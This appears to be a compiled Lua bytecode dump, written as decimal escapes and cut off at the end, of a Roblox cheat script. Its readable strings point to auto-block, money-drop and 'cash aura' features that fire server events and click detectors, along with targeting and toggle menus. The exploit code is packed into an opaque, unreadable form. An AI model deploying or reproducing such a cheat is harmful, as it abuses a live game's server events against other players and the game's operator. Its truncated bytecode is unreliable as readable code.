0\56\15\0\0\89\15\0\0\5\0\0\5\32\0\0\0\4\0\0\0\23\0\64\0\22\192\3\128\4\0\128\0\68\0\0\1\9\64\128\128\2\0\0\0\8\0\0\0\5\128\0\0\11\192\64\0\129\0\1\0\28\128\128\1\11\64\65\0\129\128\1\0\193\192\1\0\36\1\0\0\4\0\128\1\28\64\128\2\22\192\2\128\4\0\128\0\68\0\0\2\9\64\128\128\2\0\128\0\8\0\0\0\5\128\0\0\11\192\64\0\129\0\1\0\28\128\128\1\11\0\66\0\129\128\1\0\28\64\128\1\30\0\128\0\9\0\0\0\1\1\4\17\0\0\0\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\17\0\0\0\66\105\110\100\84\111\82\101\110\100\101\114\83\116\101\112\0\4\11\0\0\0\65\117\116\111\45\66\108\111\99\107\0\3\0\0\0\0\0\0\0\0\4\21\0\0\0\85\110\98\105\110\100\70\114\111\109\82\101\110\100\101\114\83\116\101\112\0\1\0\0\0\0\0\0\0\62\15\0\0\78\15\0\0\1\0\0\30\97\0\0\0\10\0\128\11\65\0\0\0\129\64\0\0\193\128\0\0\1\193\0\0\65\1\1\0\129\65\1\0\193\129\1\0\1\194\1\0\65\2\2\0\129\66\2\0\193\130\2\0\1\195\2\0\65\3\3\0\129\67\3\0\193\131\3\0\1\196\3\0\65\4\4\0\129\68\4\0\193\132\4\0\1\197\4\0\65\5\5\0\129\69\5\0\193\133\5\0\1\198\5\0\65\6\6\0\129\70\6\0\193\134\6\0\1\199\6\0\65\7\7\0\34\64\128\14\66\0\0\0\133\64\7\0\197\128\7\0\198\192\199\1\198\0\200\1\203\64\200\1\220\0\0\1\156\0\1\0\22\64\9\128\198\129\72\3\198\193\200\3\4\2\0\0\6\2\73\4\6\66\73\4\6\194\72\4\205\1\130\3\198\129\201\3\5\194\9\0\25\0\130\3\22\128\6\128\198\1\74\3\198\65\202\3\198\129\202\3\23\192\202\3\22\64\5\128\197\1\11\0\198\65\203\3\0\2\0\0\75\130\75\3\193\194\11\0\92\130\128\1\70\2\204\4\220\129\128\1\218\65\0\0\22\192\2\128\198\1\76\3\4\2\0\0\6\2\76\4\87\0\130\3\22\128\1\128\66\0\128\0\197\65\12\0\203\129\204\3\65\194\12\0\132\2\0\0\134\2\76\5\220\65\0\2\161\128\0\0\22\192\245\127\23\0\205\0\22\64\3\128\132\0\0\0\134\0\73\1\134\0\74\1\139\64\77\1\1\193\12\0\156\128\128\1\154\0\0\0\22\64\1\128\132\0\0\0\134\0\73\1\134\0\74\1\134\192\76\1\139\128\77\1\156\64\0\1\30\0\128\0\55\0\0\0\4\10\0\0\0\91\80\111\112\99\111\114\110\93\0\4\9\0\0\0\91\72\111\116\68\111\103\93\0\4\18\0\0\0\91\71\114\101\110\97\100\101\76\97\117\110\99\104\101\114\93\0\4\6\0\0\0\91\82\80\71\93\0\4\6\0\0\0\91\83\77\71\93\0\4\18\0\0\0\91\84\97\99\116\105\99\97\108\83\104\111\116\103\117\110\93\0\4\7\0\0\0\91\65\75\52\55\93\0\4\6\0\0\0\91\65\85\71\93\0\4\8\0\0\0\91\71\108\111\99\107\93\0\4\10\0\0\0\91\83\104\111\116\103\117\110\93\0\4\15\0\0\0\91\70\108\97\109\101\116\104\114\111\119\101\114\93\0\4\11\0\0\0\91\83\105\108\101\110\99\101\114\93\0\4\5\0\0\0\91\65\82\93\0\4\11\0\0\0\91\82\101\118\111\108\118\101\114\93\0\4\13\0\0\0\91\83\105\108\101\110\99\101\114\65\82\93\0\4\6\0\0\0\91\76\77\71\93\0\4\6\0\0\0\91\80\57\48\93\0\4\10\0\0\0\91\68\114\117\109\71\117\110\93\0\4\19\0\0\0\91\68\111\117\98\108\101\45\66\97\114\114\101\108\32\83\71\93\0\4\12\0\0\0\91\72\97\109\98\117\114\103\101\114\93\0\4\10\0\0\0\91\67\104\105\99\107\101\110\93\0\4\8\0\0\0\91\80\105\122\122\97\93\0\4\12\0\0\0\91\67\114\97\110\98\101\114\114\121\93\0\4\8\0\0\0\91\68\111\110\117\116\93\0\4\7\0\0\0\91\84\97\99\111\93\0\4\17\0\0\0\91\83\116\97\114\98\108\111\120\32\76\97\116\116\101\93\0\4\11\0\0\0\91\66\114\111\119\110\66\97\103\93\0\4\10\0\0\0\91\87\101\105\103\104\116\115\93\0\4\15\0\0\0\91\72\101\97\118\121\87\101\105\103\104\116\115\93\0\4\6\0\0\0\112\97\105\114\115\0\4\5\0\0\0\103\97\109\101\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\71\101\116\67\104\105\108\100\114\101\110\0\4\11\0\0\0\85\112\112\101\114\84\111\114\115\111\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\10\0\0\0\77\97\103\110\105\116\117\100\101\0\4\10\0\0\0\68\105\115\116\97\110\99\105\97\0\4\12\0\0\0\66\111\100\121\69\102\102\101\99\116\115\0\4\10\0\0\0\65\116\116\97\99\107\105\110\103\0\4\6\0\0\0\86\97\108\117\101\0\1\1\4\6\0\0\0\116\97\98\108\101\0\4\5\0\0\0\102\105\110\100\0\4\23\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\87\104\105\99\104\73\115\65\0\4\5\0\0\0\84\111\111\108\0\4\5\0\0\0\78\97\109\101\0\4\10\0\0\0\77\97\105\110\69\118\101\110\116\0\4\11\0\0\0\70\105\114\101\83\101\114\118\101\114\0\4\6\0\0\0\66\108\111\99\107\0\1\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\8\0\0\0\68\101\115\116\114\111\121\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\92\15\0\0\134\15\0\0\1\0\0\10\34\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\70\0\193\0\133\64\1\0\134\128\65\1\193\192\1\0\1\1\2\0\65\1\2\0\156\128\0\2\197\64\1\0\198\128\193\1\1\1\2\0\65\65\2\0\129\1\2\0\220\128\0\2\6\193\64\0\66\1\128\0\133\129\2\0\134\193\66\3\134\1\67\3\73\128\128\134\198\129\67\2\203\193\195\3\100\2\0\0\0\0\128\2\0\0\128\0\0\0\128\1\0\0\0\1\220\65\128\1\30\0\128\0\16\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\12\0\0\0\65\117\116\111\68\114\111\112\76\117\122\0\4\7\0\0\0\67\111\108\111\114\51\0\4\8\0\0\0\102\114\111\109\82\71\66\0\3\0\0\0\0\0\224\111\64\3\0\0\0\0\0\0\0\0\3\0\0\0\0\0\64\111\64\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\17\0\0\0\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\110\15\0\0\133\15\0\0\4\0\0\5\35\0\0\0\4\0\0\0\23\0\64\0\22\64\6\128\4\0\128\0\68\0\0\1\9\64\128\128\2\0\0\0\8\0\0\0\4\0\0\0\23\128\64\0\22\128\5\128\5\192\0\0\65\0\1\0\28\64\0\1\10\128\0\0\9\128\193\130\9\0\194\131\69\64\2\0\75\128\194\0\193\192\2\0\92\128\128\1\70\0\195\0\75\64\195\0\197\128\3\0\0\1\0\0\220\0\0\1\92\64\0\0\22\192\250\127\22\0\1\128\4\0\128\0\68\0\128\1\9\64\128\128\2\0\128\0\8\0\0\0\30\0\128\0\15\0\0\0\1\1\4\17\0\0\0\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\0\1\0\4\5\0\0\0\119\97\105\116\0\3\31\133\235\81\184\158\48\64\3\0\0\0\0\0\0\240\63\4\10\0\0\0\68\114\111\112\77\111\110\101\121\0\3\0\0\0\0\0\0\0\64\4\4\0\0\0\49\48\48\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\18\0\0\0\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\0\4\10\0\0\0\77\97\105\110\69\118\101\110\116\0\4\11\0\0\0\70\105\114\101\83\101\114\118\101\114\0\4\7\0\0\0\117\110\112\97\99\107\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\136\15\0\0\181\15\0\0\1\0\0\10\35\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\70\0\193\0\133\64\1\0\134\128\65\1\193\192\1\0\1\1\2\0\65\1\2\0\156\128\0\2\197\64\1\0\198\128\193\1\1\1\2\0\65\65\2\0\129\1\2\0\220\128\0\2\6\193\64\0\66\1\128\0\133\129\2\0\134\193\66\3\134\1\67\3\73\128\128\134\198\129\67\2\203\193\195\3\100\2\0\0\0\0\128\2\0\0\128\0\0\0\128\1\0\0\0\3\0\0\0\1\220\65\128\1\30\0\128\0\16\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\12\0\0\0\67\97\115\104\65\117\114\97\76\117\122\0\4\7\0\0\0\67\111\108\111\114\51\0\4\8\0\0\0\102\114\111\109\82\71\66\0\3\0\0\0\0\0\224\111\64\3\0\0\0\0\0\0\0\0\3\0\0\0\0\0\64\111\64\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\17\0\0\0\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\154\15\0\0\180\15\0\0\5\0\0\5\32\0\0\0\4\0\0\0\23\0\64\0\22\192\3\128\4\0\128\0\68\0\0\1\9\64\128\128\2\0\0\0\8\0\0\0\5\128\0\0\11\192\64\0\129\0\1\0\28\128\128\1\11\64\65\0\129\128\1\0\193\192\1\0\36\1\0\0\4\0\128\1\28\64\128\2\22\192\2\128\4\0\128\0\68\0\0\2\9\64\128\128\2\0\128\0\8\0\0\0\5\128\0\0\11\192\64\0\129\0\1\0\28\128\128\1\11\0\66\0\129\128\1\0\28\64\128\1\30\0\128\0\9\0\0\0\1\1\4\17\0\0\0\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\17\0\0\0\66\105\110\100\84\111\82\101\110\100\101\114\83\116\101\112\0\4\10\0\0\0\67\97\115\104\32\65\117\114\97\0\3\0\0\0\0\0\0\0\0\4\21\0\0\0\85\110\98\105\110\100\70\114\111\109\82\101\110\100\101\114\83\116\101\112\0\1\0\0\0\0\0\0\0\160\15\0\0\170\15\0\0\1\0\0\9\35\0\0\0\5\0\0\0\28\64\128\0\5\64\0\0\69\128\0\0\75\192\192\0\193\0\1\0\92\128\128\1\70\64\193\0\70\128\193\0\75\192\193\0\92\0\0\1\28\0\1\0\22\128\4\128\75\1\66\2\193\65\2\0\92\129\128\1\90\1\0\0\22\64\3\128\70\129\66\2\132\1\0\0\134\193\66\3\134\1\67\3\134\129\66\3\77\129\129\2\70\65\195\2\25\128\195\2\22\0\1\128\69\193\3\0\139\1\68\2\1\66\4\0\156\1\128\1\92\65\0\0\33\128\0\0\22\128\250\127\30\0\128\0\18\0\0\0\4\5\0\0\0\119\97\105\116\0\4\6\0\0\0\112\97\105\114\115\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\8\0\0\0\73\103\110\111\114\101\100\0\4\5\0\0\0\68\114\111\112\0\4\12\0\0\0\71\101\116\67\104\105\108\100\114\101\110\0\4\4\0\0\0\73\115\65\0\4\5\0\0\0\80\97\114\116\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\10\0\0\0\77\97\103\110\105\116\117\100\101\0\3\0\0\0\0\0\0\40\64\4\18\0\0\0\102\105\114\101\99\108\105\99\107\100\101\116\101\99\116\111\114\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\14\0\0\0\67\108\105\99\107\68\101\116\101\99\116\111\114\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\183\15\0\0\206\15\0\0\1\0\0\12\46\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\192\64\0\134\192\64\1\134\192\64\1\134\0\65\1\198\192\64\0\198\192\192\1\198\192\192\1\198\64\193\1\6\193\64\0\6\193\64\2\6\193\64\2\6\129\65\2\70\193\64\0\70\193\192\2\70\193\192\2\70\193\193\2\134\193\64\0\134\193\64\3\134\193\64\3\134\1\66\3\198\193\64\0\198\193\192\3\198\193\192\3\198\65\194\3\6\194\64\0\6\194\64\4\6\194\64\4\6\130\66\4\70\194\194\0\75\2\195\4\228\2\0\0\0\0\0\1\0\0\128\1\0\0\0\2\0\0\128\2\0\0\0\3\0\0\128\3\0\0\0\4\92\66\128\1\30\0\128\0\13\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\4\0\0\0\72\111\109\0\4\10\0\0\0\77\97\105\110\70\114\97\109\101\0\4\12\0\0\0\84\97\114\103\101\116\70\114\97\109\101\0\4\9\0\0\0\70\117\110\70\114\97\109\101\0\4\13\0\0\0\84\111\103\103\108\101\115\70\114\97\109\101\0\4\11\0\0\0\69\120\116\114\97\70\114\97\109\101\0\4\12\0\0\0\72\101\97\116\108\104\70\114\97\109\101\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\194\15\0\0\205\15\0\0\7\0\0\2\15\0\0\0\4\0\0\0\9\64\64\128\4\0\128\0\9\64\64\128\4\0\0\1\9\64\64\128\4\0\128\1\9\64\64\128\4\0\0\2\9\64\64\128\4\0\128\2\9\128\64\128\4\0\0\3\9\64\64\128\30\0\128\0\3\0\0\0\4\8\0\0\0\86\105\115\105\98\108\101\0\1\0\1\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\208\15\0\0\230\15\0\0\1\0\0\12\46\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\192\64\0\134\192\64\1\134\192\64\1\134\0\65\1\198\192\64\0\198\192\192\1\198\192\192\1\198\64\193\1\6\193\64\0\6\193\64\2\6\193\64\2\6\129\65\2\70\193\64\0\70\193\192\2\70\193\192\2\70\193\193\2\134\193\64\0\134\193\64\3\134\193\64\3\134\1\66\3\198\193\64\0\198\193\192\3\198\193\192\3\198\65\194\3\6\194\64\0\6\194\64\4\6\194\64\4\6\130\66\4\70\194\194\0\75\2\195\4\228\2\0\0\0\0\0\1\0\0\128\1\0\0\0\2\0\0\128\2\0\0\0\3\0\0\128\3\0\0\0\4\92\66\128\1\30\0\128\0\13\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\4\0\0\0\72\111\109\0\4\10\0\0\0\77\97\105\110\70\114\97\109\101\0\4\12\0\0\0\84\97\114\103\101\116\70\114\97\109\101\0\4\9\0\0\0\70\117\110\70\114\97\109\101\0\4\13\0\0\0\84\111\103\103\108\101\115\70\114\97\109\101\0\4\11\0\0\0\69\120\116\114\97\70\114\97\109\101\0\4\12\0\0\0\72\101\97\116\108\104\70\114\97\109\101\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\219\15\0\0\229\15\0\0\7\0\0\2\15\0\0\0\4\0\0\0\9\64\64\128\4\0\128\0\9\64\64\128\4\0\0\1\9\64\64\128\4\0\128\1\9\128\64\128\4\0\0\2\9\64\64\128\4\0\128\2\9\64\64\128\4\0\0\3\9\64\64\128\30\0\128\0\3\0\0\0\4\8\0\0\0\86\105\115\105\98\108\101\0\1\0\1\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\232\15\0\0\255\15\0\0\1\0\0\13\50\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\192\64\0\134\192\64\1\134\192\64\1\134\0\65\1\198\192\64\0\198\192\192\1\198\192\192\1\198\64\193\1\6\193\64\0\6\193\64\2\6\193\64\2\6\129\65\2\70\193\64\0\70\193\192\2\70\193\192\2\70\193\193\2\134\193\64\0\134\193\64\3\134\193\64\3\134\1\66\3\198\193\64\0\198\193\192\3\198\193\192\3\198\65\194\3\6\194\64\0\6\194\64\4\6\194\64\4\6\130\66\4\70\194\64\0\70\194\192\4\70\194\192\4\70\130\194\4\134\194\194\0\139\2\67\5\36\3\0\0\0\0\0\1\0\0\128\1\0\0\0\2\0\0\128\2\0\0\0\3\0\0\128\3\0\0\128\4\156\66\128\1\30\0\128\0\13\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\4\0\0\0\72\111\109\0\4\10\0\0\0\77\97\105\110\70\114\97\109\101\0\4\12\0\0\0\84\97\114\103\101\116\70\114\97\109\101\0\4\9\0\0\0\70\117\110\70\114\97\109\101\0\4\13\0\0\0\84\111\103\103\108\101\115\70\114\97\109\101\0\4\11\0\0\0\69\120\116\114\97\70\114\97\109\101\0\4\12\0\0\0\72\101\97\116\108\104\70\114\97\109\101\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\244\15\0\0\254\15\0\0\7\0\0\2\15\0\0\0\4\0\0\0\9\64\64\128\4\0\128\0\9\128\64\128\4\0\0\1\9\64\64\128\4\0\128\1\9\64\64\128\4\0\0\2\9\64\64\128\4\0\128\2\9\64\64\128\4\0\0\3\9\64\64\128\30\0\128\0\3\0\0\0\4\8\0\0\0\86\105\115\105\98\108\101\0\1\0\1\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\16\0\0\24\16\0\0\1\0\0\12\46\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\192\64\0\134\192\64\1\134\192\64\1\134\0\65\1\198\192\64\0\198\192\192\1\198\192\192\1\198\64\193\1\6\193\64\0\6\193\64\2\6\193\64\2\6\129\65\2\70\193\64\0\70\193\192\2\70\193\192\2\70\193\193\2\134\193\64\0\134\193\64\3\134\193\64\3\134\1\66\3\198\193\64\0\198\193\192\3\198\193\192\3\198\65\194\3\6\194\64\0\6\194\64\4\6\194\64\4\6\130\66\4\70\194\194\0\75\2\195\4\228\2\0\0\0\0\0\1\0\0\128\1\0\0\0\2\0\0\128\2\0\0\0\3\0\0\128\3\0\0\0\4\92\66\128\1\30\0\128\0\13\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\4\0\0\0\72\111\109\0\4\10\0\0\0\77\97\105\110\70\114\97\109\101\0\4\12\0\0\0\84\97\114\103\101\116\70\114\97\109\101\0\4\9\0\0\0\70\117\110\70\114\97\109\101\0\4\13\0\0\0\84\111\103\103\108\101\115\70\114\97\109\101\0\4\11\0\0\0\69\120\116\114\97\70\114\97\109\101\0\4\12\0\0\0\72\101\97\116\108\104\70\114\97\109\101\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\13\16\0\0\23\16\0\0\7\0\0\2\15\0\0\0\4\0\0\0\9\64\64\128\4\0\128\0\9\64\64\128\4\0\0\1\9\128\64\128\4\0\128\1\9\64\64\128\4\0\0\2\9\64\64\128\4\0\128\2\9\64\64\128\4\0\0\3\9\64\64\128\30\0\128\0\3\0\0\0\4\8\0\0\0\86\105\115\105\98\108\101\0\1\0\1\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\26\16\0\0\49\16\0\0\1\0\0\12\46\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\192\64\0\134\192\64\1\134\192\64\1\134\0\65\1\198\192\64\0\198\192\192\1\198\192\192\1\198\64\193\1\6\193\64\0\6\193\64\2\6\193\64\2\6\129\65\2\70\193\64\0\70\193\192\2\70\193\192\2\70\193\193\2\134\193\64\0\134\193\64\3\134\193\64\3\134\1\66\3\198\193\64\0\198\193\192\3\198\193\192\3\198\65\194\3\6\194\64\0\6\194\64\4\6\194\64\4\6\130\66\4\70\194\194\0\75\2\195\4\228\2\0\0\0\0\0\1\0\0\128\1\0\0\0\2\0\0\128\2\0\0\0\3\0\0\128\3\0\0\0\4\92\66\128\1\30\0\128\0\13\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\4\0\0\0\72\111\109\0\4\10\0\0\0\77\97\105\110\70\114\97\109\101\0\4\12\0\0\0\84\97\114\103\101\116\70\114\97\109\101\0\4\9\0\0\0\70\117\110\70\114\97\109\101\0\4\13\0\0\0\84\111\103\103\108\101\115\70\114\97\109\101\0\4\11\0\0\0\69\120\116\114\97\70\114\97\109\101\0\4\12\0\0\0\72\101\97\116\108\104\70\114\97\109\101\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\38\16\0\0\48\16\0\0\7\0\0\2\15\0\0\0\4\0\0\0\9\64\64\128\4\0\128\0\9\64\64\128\4\0\0\1\9\64\64\128\4\0\128\1\9\64\64\128\4\0\0\2\9\128\64\128\4\0\128\2\9\64\64\128\4\0\0\3\9\64\64\128\30\0\128\0\3\0\0\0\4\8\0\0\0\86\105\115\105\98\108\101\0\1\0\1\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\51\16\0\0\75\16\0\0\1\0\0\12\46\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\192\64\0\134\192\64\1\134\192\64\1\134\0\65\1\198\192\64\0\198\192\192\1\198\192\192\1\198\64\193\1\6\193\64\0\6\193\64\2\6\193\64\2\6\129\65\2\70\193\64\0\70\193\192\2\70\193\192\2\70\193\193\2\134\193\64\0\134\193\64\3\134\193\64\3\134\1\66\3\198\193\64\0\198\193\192\3\198\193\192\3\198\65\194\3\6\194\64\0\6\194\64\4\6\194\64\4\6\130\66\4\70\194\194\0\75\2\195\4\228\2\0\0\0\0\0\1\0\0\128\1\0\0\0\2\0\0\128\2\0\0\0\3\0\0\128\3\0\0\0\4\92\66\128\1\30\0\128\0\13\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\4\0\0\0\72\111\109\0\4\10\0\0\0\77\97\105\110\70\114\97\109\101\0\4\12\0\0\0\84\97\114\103\101\116\70\114\97\109\101\0\4\9\0\0\0\70\117\110\70\114\97\109\101\0\4\13\0\0\0\84\111\103\103\108\101\115\70\114\97\109\101\0\4\11\0\0\0\69\120\116\114\97\70\114\97\109\101\0\4\12\0\0\0\72\101\97\116\108\104\70\114\97\109\101\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\63\16\0\0\74\16\0\0\7\0\0\2\15\0\0\0\4\0\0\0\9\64\64\128\4\0\128\0\9\64\64\128\4\0\0\1\9\64\64\128\4\0\128\1\9\64\64\128\4\0\0\2\9\64\64\128\4\0\128\2\9\64\64\128\4\0\0\3\9\128\64\128\30\0\128\0\3\0\0\0\4\8\0\0\0\86\105\115\105\98\108\101\0\1\0\1\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\77\16\0\0\100\16\0\0\1\0\0\12\46\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\192\64\0\134\192\64\1\134\192\64\1\134\0\65\1\198\192\64\0\198\192\192\1\198\192\192\1\198\64\193\1\6\193\64\0\6\193\64\2\6\193\64\2\6\129\65\2\70\193\64\0\70\193\192\2\70\193\192\2\70\193\193\2\134\193\64\0\134\193\64\3\134\193\64\3\134\1\66\3\198\193\64\0\198\193\192\3\198\193\192\3\198\65\194\3\6\194\64\0\6\194\64\4\6\194\64\4\6\130\66\4\70\194\194\0\75\2\195\4\228\2\0\0\0\0\0\1\0\0\128\1\0\0\0\2\0\0\128\2\0\0\0\3\0\0\128\3\0\0\0\4\92\66\128\1\30\0\128\0\13\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\4\0\0\0\72\111\109\0\4\10\0\0\0\77\97\105\110\70\114\97\109\101\0\4\12\0\0\0\84\97\114\103\101\116\70\114\97\109\101\0\4\9\0\0\0\70\117\110\70\114\97\109\101\0\4\13\0\0\0\84\111\103\103\108\101\115\70\114\97\109\101\0\4\11\0\0\0\69\120\116\114\97\70\114\97\109\101\0\4\12\0\0\0\72\101\97\116\108\104\70\114\97\109\101\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\89\16\0\0\99\16\0\0\7\0\0\2\15\0\0\0\4\0\0\0\9\64\64\128\4\0\128\0\9\128\64\128\4\0\0\1\9\128\64\128\4\0\128\1\9\128\64\128\4\0\0\2\9\128\64\128\4\0\128\2\9\128\64\128\4\0\0\3\9\128\64\128\30\0\128\0\3\0\0\0\4\8\0\0\0\86\105\115\105\98\108\101\0\1\1\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\102\16\0\0\111\16\0\0\1\0\0\9\31\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\69\192\0\0\70\0\193\0\70\64\193\0\70\128\193\0\133\192\1\0\134\0\66\1\134\64\66\1\197\192\1\0\198\128\194\1\198\192\194\1\5\193\0\0\11\1\67\2\129\1\1\0\28\129\128\1\11\65\67\2\128\1\128\0\192\1\0\1\0\2\128\1\28\193\128\2\131\1\0\3\198\193\67\0\199\129\3\0\195\1\128\3\5\130\3\0\9\2\1\135\30\0\128\0\16\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\7\0\0\0\85\115\101\114\73\100\0\4\5\0\0\0\69\110\117\109\0\4\14\0\0\0\84\104\117\109\98\110\97\105\108\84\121\112\101\0\4\9\0\0\0\72\101\97\100\83\104\111\116\0\4\14\0\0\0\84\104\117\109\98\110\97\